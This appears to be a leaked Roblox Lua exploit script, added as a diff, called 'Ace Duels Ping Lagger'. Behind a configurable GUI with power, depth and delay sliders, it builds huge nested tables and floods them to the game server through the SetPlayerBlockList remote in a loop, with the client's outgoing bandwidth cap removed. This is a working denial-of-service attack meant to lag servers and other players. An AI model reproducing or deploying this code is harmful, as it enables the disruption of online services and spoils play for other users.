@@ -1,0 +1,629 @@
+-- Leaked by 6wakee and adventurous_starfish_66787
+-- Leaked by 6wakee and adventurous_starfish_66787
+
+local Players        = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local NetworkClient  = game:GetService("NetworkClient")
+local HttpService    = game:GetService("HttpService")
+local CoreGui        = game:GetService("CoreGui")
+
+local player     = Players.LocalPlayer
+local playerGui  = player:WaitForChild("PlayerGui")
+
+print("-- Leaked by 6wakee and adventurous_starfish_66787")
+
+-- ==================== CLEANUP ====================
+local function cleanOld(name)
+    pcall(function() if CoreGui:FindFirstChild(name) then CoreGui[name]:Destroy() end end)
+    pcall(function() if playerGui:FindFirstChild(name) then playerGui[name]:Destroy() end end)
+end
+cleanOld("AceDuelsUIOnly")
+cleanOld("VisionSpeedLagger")
+
+print("-- Leaked by 6wakee and adventurous_starfish_66787")
+
+-- ==================== CONFIG ====================
+local CONFIG_FILE = "AcePingLaggerConfig.json"
+local Config = {
+    Power    = 15,
+    Keybind  = Enum.KeyCode.I,
+    PingLag  = 285,
+    Depth    = 296,
+    VysePower = 100000,
+    Delay    = 22,
+    Tables   = 1,
+}
+
+local function saveConfig()
+    pcall(function()
+        writefile(CONFIG_FILE, HttpService:JSONEncode({
+            power   = Config.Power,
+            keybind = Config.Keybind and Config.Keybind.Name or "I",
+            pinglag = Config.PingLag,
+            depth   = Config.Depth,
+            vysepower = Config.VysePower,
+            delay   = Config.Delay,
+            tables  = Config.Tables,
+        }))
+    end)
+end
+
+local function loadConfig()
+    local exists = false
+    pcall(function() exists = isfile(CONFIG_FILE) end)
+    if not exists then return end
+    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
+    if not ok or type(data) ~= "table" then return end
+    if type(data.power)   == "number" then Config.Power   = math.clamp(math.floor(data.power), 1, 100) end
+    if type(data.keybind) == "string" and Enum.KeyCode[data.keybind] then
+        Config.Keybind = Enum.KeyCode[data.keybind]
+    end
+    if type(data.depth)    == "number" then Config.Depth    = math.clamp(math.floor(data.depth), 10, 1000) end
+    if type(data.vysepower) == "number" then Config.VysePower = math.clamp(math.floor(data.vysepower), 1000, 10000000) end
+    if type(data.delay)    == "number" then Config.Delay    = math.max(0.001, data.delay) end
+    if type(data.tables)   == "number" then Config.Tables   = math.clamp(math.floor(data.tables), 1, 100) end
+end
+
+loadConfig()
+
+print("-- Leaked by 6wakee and adventurous_starfish_66787")
+
+-- ==================== VISION LAGGER LOGIC ====================
+local enabled        = false
+local lagThread      = nil
+local bomb           = nil
+
+local function buildBomb()
+    print("-- Leaked by 6wakee and adventurous_starfish_66787")
+    local main = {}
+    for _ = 1, Config.Tables do
+        local spam = {{}}
+        local z = spam[1]
+        for _ = 1, Config.Depth do
+            local t = {}; table.insert(z, t); z = t
+        end
+        local maximum = math.floor(Config.VysePower / (Config.Depth + 2))
+        for _ = 1, maximum do table.insert(main, spam) end
+    end
+    return main
+end
+
+local function fireBomb()
+    pcall(function()
+        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
+    end)
+end
+
+local function getSpoofedBurst()
+    return math.max(1, math.floor(Config.Power) * 10)
+end
+
+local function instantRecovery()
+    pcall(function() NetworkClient:SetOutgoingKBPSLimit(0) end)
+    task.spawn(function()
+        for _ = 1, 6 do
+            if enabled then break end
+            pcall(function() game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer({}) end)
+            pcall(function() NetworkClient:SetOutgoingKBPSLimit(0) end)
+            task.wait()
+        end
+    end)
+end
+
+local function stopLagger()
+    if not enabled then return end
+    enabled = false
+    lagThread = nil
+    bomb = nil
+    instantRecovery()
+    print("-- Leaked by 6wakee and adventurous_starfish_66787")
+end
+
+local function startLagger()
+    if enabled then return end
+    enabled = true
+    pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
+    bomb = buildBomb()
+    lagThread = task.spawn(function()
+        while enabled do
+            local burst = getSpoofedBurst()
+            for _ = 1, burst do
+                if not enabled then break end
+                fireBomb()
+                if burst > 1 then task.wait(0.01) end
+            end
+            task.wait(Config.Delay / 1000)
+        end
+    end)
+    print("-- Leaked by 6wakee and adventurous_starfish_66787")
+end
+
+-- ==================== UI HELPERS ====================
+local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
+local UI_SCALE = isMobile and 0.82 or 1
+
+local PANEL_W = 280
+local PANEL_H = 410
+local MIN_H   = 42
+
+local minimized          = false
+local listeningForKeybind = false
+
+local function makeCorner(parent, radius)
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, radius)
+    c.Parent = parent
+    return c
+end
+
+local function makeStroke(parent, color, thickness)
+    local s = Instance.new("UIStroke")
+    s.Color = color; s.Thickness = thickness or 1; s.Parent = parent
+    return s
+end
+
+print("-- Leaked by 6wakee and adventurous_starfish_66787")
+
+-- ==================== GUI ====================
+local gui = Instance.new("ScreenGui")
+gui.Name = "AceDuelsUIOnly"
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = playerGui
+
+local frame = Instance.new("Frame", gui)
+frame.Name = "MainFrame"
+frame.Size = UDim2.new(0, PANEL_W, 0, PANEL_H)
+frame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+frame.BorderSizePixel = 0
+frame.ClipsDescendants = true
+makeStroke(frame, Color3.fromRGB(0, 0, 0), 2)
+
+local scale = Instance.new("UIScale", frame)
+scale.Scale = UI_SCALE
+
+local bg = Instance.new("ImageLabel", frame)
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundTransparency = 1
+bg.Image = "rbxassetid://129915459930965"
+bg.ScaleType = Enum.ScaleType.Crop
+bg.ImageTransparency = 0.3
+bg.ZIndex = 1
+
+local overlay = Instance.new("Frame", frame)
+overlay.Size = UDim2.new(1, 0, 1, 0)
+overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+overlay.BackgroundTransparency = 0.22
+overlay.BorderSizePixel = 0
+overlay.ZIndex = 2
+
+local title = Instance.new("TextLabel", frame)
+title.AnchorPoint = Vector2.new(0.5, 0)
+title.Size = UDim2.new(1, -70, 0, 32)
+title.Position = UDim2.new(0.5, -16, 0, 10)
+title.BackgroundTransparency = 1
+title.Text = "Ace Duels Ping Lagger"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 18
+title.Font = Enum.Font.GothamBlack
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.TextYAlignment = Enum.TextYAlignment.Center
+title.ZIndex = 5
+
+local minBtn = Instance.new("TextButton", frame)
+minBtn.Size = UDim2.new(0, 24, 0, 24)
+minBtn.Position = UDim2.new(1, -34, 0, 10)
+minBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+minBtn.BorderSizePixel = 0
+minBtn.Text = "−"
+minBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+minBtn.TextSize = 16
+minBtn.Font = Enum.Font.GothamBold
+minBtn.ZIndex = 5
+makeCorner(minBtn, 6)
+makeStroke(minBtn, Color3.fromRGB(40, 40, 40), 1)
+
+print("-- Leaked by 6wakee and adventurous_starfish_66787")
+
+-- Discord bubble
+local discordBubble = Instance.new("Frame", frame)
+discordBubble.AnchorPoint = Vector2.new(0.5, 0)
+discordBubble.Size = UDim2.new(1, -24, 0, 22)
+discordBubble.Position = UDim2.new(0.5, 0, 0, 46)
+discordBubble.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+discordBubble.BackgroundTransparency = 0.08
+discordBubble.BorderSizePixel = 0
+discordBubble.ZIndex = 5
+makeCorner(discordBubble, 8)
+makeStroke(discordBubble, Color3.fromRGB(52, 52, 52), 1.25)
+Instance.new("UIGradient", discordBubble).Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(28, 28, 28)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(14, 14, 14))
+})
+local discordTxt = Instance.new("TextLabel", discordBubble)
+discordTxt.Size = UDim2.new(1, -12, 1, 0)
+discordTxt.Position = UDim2.new(0, 6, 0, 0)
+discordTxt.BackgroundTransparency = 1
+discordTxt.Text = "discord.gg/aceduels"
+discordTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
+discordTxt.Font = Enum.Font.GothamBold
+discordTxt.TextSize = 11
+discordTxt.TextXAlignment = Enum.TextXAlignment.Center
+discordTxt.ZIndex = 6
+
+-- Status button
+local statusBtn = Instance.new("TextButton", frame)
+statusBtn.AnchorPoint = Vector2.new(0.5, 0)
+statusBtn.Size = UDim2.new(1, -24, 0, 42)
+statusBtn.Position = UDim2.new(0.5, 0, 0, 78)
+statusBtn.BackgroundColor3 = Color3.fromRGB(190, 190, 190)
+statusBtn.BorderSizePixel = 0
+statusBtn.Text = "DISABLED"
+statusBtn.TextColor3 = Color3.fromRGB(22, 22, 22)
+statusBtn.TextSize = 20
+statusBtn.Font = Enum.Font.GothamBlack
+statusBtn.ZIndex = 5
+statusBtn.AutoButtonColor = false
+makeCorner(statusBtn, 12)
+local statusStroke   = makeStroke(statusBtn, Color3.fromRGB(215, 215, 215), 2.5)
+local statusGradient = Instance.new("UIGradient", statusBtn)
+statusGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(210, 210, 210)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(155, 155, 155))
+})
+local statusTextStroke = Instance.new("UIStroke", statusBtn)
+statusTextStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+statusTextStroke.Color = Color3.fromRGB(0, 0, 0)
+statusTextStroke.Thickness = 1.8
+
+local function refreshStatusButton()
+    if enabled then
+        statusBtn.Text = "ENABLED"
+        statusBtn.TextColor3 = Color3.fromRGB(10, 10, 10)
+        statusBtn.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
+        statusStroke.Color = Color3.fromRGB(255, 255, 255)
+        statusGradient.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(185, 185, 185))
+        })
+    else
+        statusBtn.Text = "DISABLED"
+        statusBtn.TextColor3 = Color3.fromRGB(22, 22, 22)
+        statusBtn.BackgroundColor3 = Color3.fromRGB(190, 190, 190)
+        statusStroke.Color = Color3.fromRGB(215, 215, 215)
+        statusGradient.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(210, 210, 210)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(155, 155, 155))
+        })
+    end
+end
+
+statusBtn.MouseButton1Click:Connect(function()
+    if enabled then stopLagger() else startLagger() end
+    refreshStatusButton()
+end)
+
+-- Keybind row
+local keybindFrame = Instance.new("Frame", frame)
+keybindFrame.AnchorPoint = Vector2.new(0.5, 0)
+keybindFrame.Size = UDim2.new(1, -24, 0, 36)
+keybindFrame.Position = UDim2.new(0.5, 0, 0, 130)
+keybindFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+keybindFrame.BackgroundTransparency = 0.08
+keybindFrame.BorderSizePixel = 0
+keybindFrame.ZIndex = 5
+makeCorner(keybindFrame, 10)
+makeStroke(keybindFrame, Color3.fromRGB(52, 52, 52), 1.5)
+Instance.new("UIGradient", keybindFrame).Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(28, 28, 28)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(14, 14, 14))
+})
+local keybindLabel = Instance.new("TextLabel", keybindFrame)
+keybindLabel.Size = UDim2.new(0, 90, 1, 0)
+keybindLabel.Position = UDim2.new(0, 12, 0, 0)
+keybindLabel.BackgroundTransparency = 1
+keybindLabel.Text = "Keybind"
+keybindLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+keybindLabel.TextSize = 14
+keybindLabel.Font = Enum.Font.GothamMedium
+keybindLabel.TextXAlignment = Enum.TextXAlignment.Left
+keybindLabel.ZIndex = 6
+
+local keybindBtn = Instance.new("TextButton", keybindFrame)
+keybindBtn.Size = UDim2.new(0, 44, 0, 20)
+keybindBtn.AnchorPoint = Vector2.new(1, 0.5)
+keybindBtn.Position = UDim2.new(1, -12, 0.5, 0)
+keybindBtn.BackgroundColor3 = Color3.fromRGB(215, 215, 215)
+keybindBtn.BorderSizePixel = 0
+keybindBtn.Text = Config.Keybind.Name
+keybindBtn.TextColor3 = Color3.fromRGB(16, 16, 16)
+keybindBtn.TextSize = 12
+keybindBtn.Font = Enum.Font.GothamBold
+keybindBtn.ZIndex = 6
+keybindBtn.AutoButtonColor = false
+makeCorner(keybindBtn, 5)
+local keybindBtnStroke = makeStroke(keybindBtn, Color3.fromRGB(235, 235, 235), 1)
+local keybindBtnGrad = Instance.new("UIGradient", keybindBtn)
+keybindBtnGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(235, 235, 235)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(185, 185, 185))
+})
+
+local function refreshKeybindButton()
+    if listeningForKeybind then
+        keybindBtn.Text = "..."
+        keybindBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
+        keybindBtnStroke.Color = Color3.fromRGB(255, 255, 255)
+        keybindBtnGrad.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(210, 210, 210))
+        })
+    else
+        keybindBtn.Text = Config.Keybind.Name
+        keybindBtn.BackgroundColor3 = Color3.fromRGB(215, 215, 215)
+        keybindBtnStroke.Color = Color3.fromRGB(235, 235, 235)
+        keybindBtnGrad.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(235, 235, 235)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(185, 185, 185))
+        })
+    end
+end
+
+keybindBtn.MouseButton1Click:Connect(function()
+    listeningForKeybind = true
+    refreshKeybindButton()
+end)
+
+print("-- Leaked by 6wakee and adventurous_starfish_66787")
+
+-- Helper function to create a slider row
+local function createSliderRow(parent, label, min, max, default, position, callback)
+    local frame = Instance.new("Frame", parent)
+    frame.AnchorPoint = Vector2.new(0.5, 0)
+    frame.Size = UDim2.new(1, -24, 0, 44)
+    frame.Position = UDim2.new(0.5, 0, 0, position)
+    frame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+    frame.BackgroundTransparency = 0.08
+    frame.BorderSizePixel = 0
+    frame.ZIndex = 5
+    makeCorner(frame, 10)
+    makeStroke(frame, Color3.fromRGB(52, 52, 52), 1.5)
+    Instance.new("UIGradient", frame).Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(28, 28, 28)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(14, 14, 14))
+    })
+    
+    local labelTxt = Instance.new("TextLabel", frame)
+    labelTxt.Size = UDim2.new(0, 90, 1, 0)
+    labelTxt.Position = UDim2.new(0, 12, 0, 0)
+    labelTxt.BackgroundTransparency = 1
+    labelTxt.Text = label
+    labelTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
+    labelTxt.TextSize = 12
+    labelTxt.Font = Enum.Font.GothamMedium
+    labelTxt.TextXAlignment = Enum.TextXAlignment.Left
+    labelTxt.ZIndex = 6
+    
+    local minusBtn = Instance.new("TextButton", frame)
+    minusBtn.Size = UDim2.new(0, 24, 0, 24)
+    minusBtn.Position = UDim2.new(1, -108, 0.5, -12)
+    minusBtn.BackgroundColor3 = Color3.fromRGB(215, 215, 215)
+    minusBtn.BorderSizePixel = 0
+    minusBtn.Text = "-"
+    minusBtn.TextColor3 = Color3.fromRGB(18, 18, 18)
+    minusBtn.TextSize = 16
+    minusBtn.Font = Enum.Font.GothamBold
+    minusBtn.ZIndex = 6
+    minusBtn.AutoButtonColor = false
+    makeCorner(minusBtn, 6)
+    makeStroke(minusBtn, Color3.fromRGB(235, 235, 235), 1.25)
+    Instance.new("UIGradient", minusBtn).Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(235, 235, 235)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(185, 185, 185))
+    })
+
+    local plusBtn = Instance.new("TextButton", frame)
+    plusBtn.Size = UDim2.new(0, 24, 0, 24)
+    plusBtn.Position = UDim2.new(1, -12, 0.5, -12)
+    plusBtn.AnchorPoint = Vector2.new(1, 0)
+    plusBtn.BackgroundColor3 = Color3.fromRGB(215, 215, 215)
+    plusBtn.BorderSizePixel = 0
+    plusBtn.Text = "+"
+    plusBtn.TextColor3 = Color3.fromRGB(18, 18, 18)
+    plusBtn.TextSize = 16
+    plusBtn.Font = Enum.Font.GothamBold
+    plusBtn.ZIndex = 6
+    plusBtn.AutoButtonColor = false
+    makeCorner(plusBtn, 6)
+    makeStroke(plusBtn, Color3.fromRGB(235, 235, 235), 1.25)
+    Instance.new("UIGradient", plusBtn).Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(235, 235, 235)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(185, 185, 185))
+    })
+
+    local valueLabel = Instance.new("TextLabel", frame)
+    valueLabel.Size = UDim2.new(0, 52, 1, 0)
+    valueLabel.Position = UDim2.new(1, -86, 0, 0)
+    valueLabel.BackgroundTransparency = 1
+    valueLabel.Text = tostring(default)
+    valueLabel.TextColor3 = Color3.fromRGB(245, 245, 245)
+    valueLabel.TextSize = 14
+    valueLabel.Font = Enum.Font.GothamBold
+    valueLabel.TextXAlignment = Enum.TextXAlignment.Center
+    valueLabel.ZIndex = 6
+
+    local currentValue = default
+    local step = (max - min) <= 1 and 0.001 or 1
+
+    minusBtn.MouseButton1Click:Connect(function()
+        currentValue = math.max(min, currentValue - step)
+        valueLabel.Text = tostring(math.floor(currentValue * 1000 + 0.5) / 1000)
+        callback(currentValue)
+    end)
+    plusBtn.MouseButton1Click:Connect(function()
+        currentValue = math.min(max, currentValue + step)
+        valueLabel.Text = tostring(math.floor(currentValue * 1000 + 0.5) / 1000)
+        callback(currentValue)
+    end)
+    
+    return {
+        frame = frame,
+        valueLabel = valueLabel,
+        setValue = function(val)
+            currentValue = math.clamp(val, min, max)
+            valueLabel.Text = tostring(math.floor(currentValue * 1000 + 0.5) / 1000)
+        end
+    }
+end
+
+-- Power slider
+local powerSlider = createSliderRow(frame, "Power (1-100)", 1, 100, Config.Power, 176, function(val)
+    Config.Power = math.floor(val)
+    saveConfig()
+end)
+
+-- Depth slider
+local depthSlider = createSliderRow(frame, "Table Depth", 10, 1000, Config.Depth, 228, function(val)
+    Config.Depth = math.floor(val)
+    saveConfig()
+end)
+
+-- Vyse Power slider
+local vyseSlider = createSliderRow(frame, "Vyse Power", 1000, 10000000, Config.VysePower, 280, function(val)
+    Config.VysePower = math.floor(val)
+    saveConfig()
+end)
+vyseSlider.valueLabel.Text = tostring(math.floor(Config.VysePower / 1000)) .. "K"
+local origVyseSet = vyseSlider.setValue
+vyseSlider.setValue = function(val)
+    origVyseSet(val)
+    vyseSlider.valueLabel.Text = tostring(math.floor(val / 1000)) .. "K"
+end
+vyseSlider.setValue(Config.VysePower)
+
+-- Delay slider
+local delaySlider = createSliderRow(frame, "Delay (ms)", 1, 1000, Config.Delay, 332, function(val)
+    Config.Delay = val
+    saveConfig()
+end)
+delaySlider.valueLabel.Text = tostring(math.floor(Config.Delay)) .. "ms"
+local origDelaySet = delaySlider.setValue
+delaySlider.setValue = function(val)
+    origDelaySet(val)
+    delaySlider.valueLabel.Text = tostring(math.floor(val)) .. "ms"
+end
+delaySlider.setValue(Config.Delay)
+
+-- Tables slider
+local tablesSlider = createSliderRow(frame, "Tables", 1, 100, Config.Tables, 384, function(val)
+    Config.Tables = math.floor(val)
+    saveConfig()
+end)
+
+print("-- Leaked by 6wakee and adventurous_starfish_66787")
+
+-- ==================== INPUT ====================
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+
+    if listeningForKeybind then
+        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode ~= Enum.KeyCode.Unknown then
+            Config.Keybind = input.KeyCode
+            listeningForKeybind = false
+            saveConfig()
+            refreshKeybindButton()
+        end
+        return
+    end
+
+    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Config.Keybind then
+        if enabled then stopLagger() else startLagger() end
+        refreshStatusButton()
+    end
+end)
+
+-- ==================== MINIMIZE + DRAG ====================
+local function setMinimized(state)
+    minimized = state
+    frame.Size = UDim2.new(0, PANEL_W, 0, minimized and MIN_H or PANEL_H)
+    minBtn.Text = minimized and "+" or "−"
+end
+
+minBtn.MouseButton1Click:Connect(function()
+    setMinimized(not minimized)
+end)
+
+do
+    local dragging, dragStart, startPos, dragInput = false, nil, nil, nil
+
+    local function clampPosition(pos)
+        local cam = workspace.CurrentCamera
+        if not cam then return pos end
+        local viewport = cam.ViewportSize
+        local pW = PANEL_W * UI_SCALE
+        local pH = (minimized and MIN_H or PANEL_H) * UI_SCALE
+        return UDim2.new(0,
+            math.clamp(pos.X.Offset, -pW + 40, viewport.X - 40),
+            0,
+            math.clamp(pos.Y.Offset, 0, viewport.Y - 36)
+        )
+    end
+
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+            dragInput = input
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false; dragInput = nil
+                end
+            end)
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if not dragging then return end
+        if input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch then
+            local delta = input.Position - dragStart
+            frame.Position = clampPosition(UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + delta.X,
+                startPos.Y.Scale, startPos.Y.Offset + delta.Y
+            ))
+        end
+    end)
+
+    UserInputService.InputEnded:Connect(function(input)
+        if input == dragInput
+        or input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = false; dragInput = nil
+        end
+    end)
+end
+
+print("-- Leaked by 6wakee and adventurous_starfish_66787")
+
+-- ==================== INIT ====================
+local function centerFrame()
+    local cam = workspace.CurrentCamera
+    if not cam then return end
+    local v = cam.ViewportSize
+    frame.Position = UDim2.new(0, (v.X - PANEL_W * UI_SCALE) / 2, 0, (v.Y - PANEL_H * UI_SCALE) / 2)
+end
+
+player.CharacterRemoving:Connect(function()
+    if enabled then stopLagger(); refreshStatusButton() end
+end)
+
+centerFrame()
+setMinimized(false)
+refreshKeybindButton()
+refreshStatusButton()
+
+print("-- Leaked by 6wakee and adventurous_starfish_66787")
+print("-- Leaked by 6wakee and adventurous_starfish_66787")
+print("-- Leaked by 6wakee and adventurous_starfish_66787")
